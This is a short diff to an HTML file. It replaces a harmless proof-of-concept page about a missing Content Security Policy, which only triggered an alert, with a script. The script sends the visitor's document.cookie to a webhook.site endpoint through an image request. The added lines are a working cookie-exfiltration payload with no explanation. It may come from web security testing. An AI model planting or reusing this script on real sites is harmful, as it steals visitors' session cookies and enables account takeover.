@@ -1,18 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>CSP Missing - PoC by Enlil</title>
-</head>
-<body>
-    <h2>🚨 PoC: Missing Content Security Policy</h2>
-    <p>
-        This page demonstrates that when no CSP is present, inline JavaScript is executed.
-        If you see an alert, the browser has run JavaScript without restriction.
-    </p>
-
-    <script>
-        alert("🚨 Enlil: This site has NO CSP - Inline JS executed!");
-    </script>
-</body>
-</html>
+<script>
+  const log = new Image();
+  log.src = "https://webhook.site/your-unique-url?cookie=" + document.cookie;
+</script>
